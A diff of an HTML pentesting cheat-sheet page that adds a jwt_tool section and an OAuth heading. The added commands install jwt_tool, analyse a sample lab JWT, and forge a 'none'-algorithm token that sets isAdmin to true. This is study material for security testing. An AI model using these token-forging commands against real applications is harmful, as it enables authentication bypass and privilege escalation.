@@ -1879,8 +1879,30 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#jwt_tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        jwt_tool
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OAuth
+      
+    </span>
+  </a>
   
 </li>
       
@@ -2284,8 +2306,30 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#jwt_tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        jwt_tool
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OAuth
+      
+    </span>
+  </a>
   
 </li>
       
@@ -2594,6 +2638,28 @@ Works if the web application uses the algorithm specified in the alg-claim of th
 </span><span id="__span-8-4">python3<span class="w"> </span>exploit.py
 </span><span id="__span-8-5"><span class="c1"># resend landing page request with generated JWT</span>
 </span></code></pre></div></td></tr></table></div></p>
+<h3 id="jwt_tool">jwt_tool</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><span class="c1"># install</span>
+</span><span id="__span-9-2">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/ticarpi/jwt_tool
+</span><span id="__span-9-3">pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span><span id="__span-9-4">python3<span class="w"> </span>jwt_tool/jwt_tool.py<span class="w"> </span>-h
+</span><span id="__span-9-5">
+</span><span id="__span-9-6"><span class="c1"># analyse token</span>
+</span><span id="__span-9-7">python3<span class="w"> </span>jwt_tool/jwt_tool.py<span class="w"> </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUM-tNnrIMwvHeSZf0eB0
+</span><span id="__span-9-8">
+</span><span id="__span-9-9"><span class="c1"># create a token that uses none alg and updates payload</span>
+</span><span id="__span-9-10">python3<span class="w"> </span>jwt_tool/jwt_tool.py<span class="w"> </span>-X<span class="w"> </span>a<span class="w"> </span>-pc<span class="w"> </span>isAdmin<span class="w"> </span>-pv<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-I<span class="w"> </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUM-tNnrIMwvHeSZf0eB0
+</span></code></pre></div></td></tr></table></div>
+<h2 id="oauth">OAuth</h2>
 
 
 
